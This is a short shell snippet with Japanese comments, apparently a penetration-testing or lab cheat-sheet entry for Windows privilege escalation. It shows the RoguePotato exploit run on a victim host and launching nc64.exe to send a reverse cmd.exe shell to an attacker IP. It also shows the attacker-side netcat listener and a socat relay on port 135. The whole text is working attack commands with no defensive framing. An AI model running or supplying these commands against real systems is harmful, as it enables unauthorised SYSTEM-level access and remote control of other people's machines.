```sh
# 被害端末側: 192.168.103.97
.\RoguePotato.exe -r 192.168.45.229 -e ".\nc64.exe 192.168.45.229 1234 -e cmd.exe" -l 9999

# 攻撃端末側: 192.168.45.229
# 以下どっちも必要
nc -lvnp 1234
sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.103.97:9999
```